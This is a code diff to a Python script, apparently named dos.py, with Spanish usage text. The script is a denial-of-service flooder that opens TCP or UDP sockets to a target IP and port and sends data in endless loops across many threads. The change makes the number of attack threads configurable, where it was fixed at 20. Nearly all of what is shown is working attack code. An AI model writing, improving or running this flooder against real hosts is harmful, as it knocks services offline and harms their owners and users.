@@ -9,8 +9,9 @@ try:
 	if protocolo != 'tcp' and protocolo != 'udp':
 		print("introduce un protocolo valido.")
 		exit()
-	ip = str(argv[2])
-	port = int(argv[3])
+	theards = int(argv[2])
+	ip = str(argv[3])
+	port = int(argv[4])
 except IndexError:
 	print("""
 	
@@ -19,7 +20,7 @@ except IndexError:
 	<ip a atacar>       ip del objetivo.
 	<puerto>            puerto por el que dirigir el ataque.
 	
-	python3 dos.py  <protocolo>  <ip a atacar>  <puerto>
+	python3 dos.py  <protocolo>  <theard>  <ip a atacar>  <puerto>
 	
 	""")
 	exit()
@@ -34,7 +35,7 @@ def b():
 		while True:
 			if str(argv[1]) == 'tcp':
 				s = socket.socket()
-				s.connect((str(argv[2]), int(argv[3])))
+				s.connect((str(argv[3]), int(argv[4])))
 			elif str(argv[1]) == 'udp':
 				s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
@@ -43,7 +44,7 @@ def b():
 				if str(argv[1]) == 'tcp':
 					s.send(eax.encode())
 				elif str(argv[1]) == 'udp':		
-					s.sendto(eax.encode(),(str(argv[2]), int(argv[3])))
+					s.sendto(eax.encode(),(str(argv[3]), int(argv[4])))
 		
 				print("funciona")
 
@@ -57,7 +58,7 @@ def b():
 					if str(argv[1]) == 'tcp':
 						s.send(eax.encode())
 					elif str(argv[1]) == 'udp':		
-						s.sendto(eax.encode(),(str(argv[2]), int(argv[3])))
+						s.sendto(eax.encode(),(str(argv[3]), int(argv[4])))
 
 				except BrokenPipeError:
 					pass
@@ -72,6 +73,6 @@ def b():
 		pilaConexiones.append(hilo)
 
 pilaProcesos = []
-for f in range(0,20):
+for f in range(0, int(argv[2])):
 	proceso = threading.Thread(target=b)
 	proceso.start()
